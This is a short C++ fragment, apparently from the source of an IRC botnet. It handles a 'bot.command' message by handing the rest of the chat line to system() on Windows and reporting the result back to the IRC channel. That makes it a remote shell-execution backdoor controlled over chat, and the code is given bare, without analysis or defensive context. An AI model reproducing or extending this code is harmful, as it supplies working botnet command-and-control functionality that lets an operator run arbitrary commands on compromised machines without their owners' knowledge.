if (!pMsg->sCmd.Compare("bot.command")) {
#ifdef WIN32
  if (!(pMsg->sChatString.GetLength() >
        (pMsg->sCmd.GetLength()
          + pMsg->sChatString.Token(1, " ").GetLength()
          + 3)))
    return false;
  CString sText;
  sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength() + 2]);
  bool bRet = false;
  CString sReplyBuf;
  sReplyBuf.Format("command (%s) executed.", sText.CStr());

  if (system(sText.CStr()) == -1) {
    g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice,
                                "couldn't execute command.",
                                pMsg->sReplyTo.Str());
    return false;
  } else {
    g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent,
                                pMsg->bNotice,
                                sReplyBuf.Str(),
                                pMsg->sReplyTo.Str());
    return false;
  }
#endif
  return true;
}
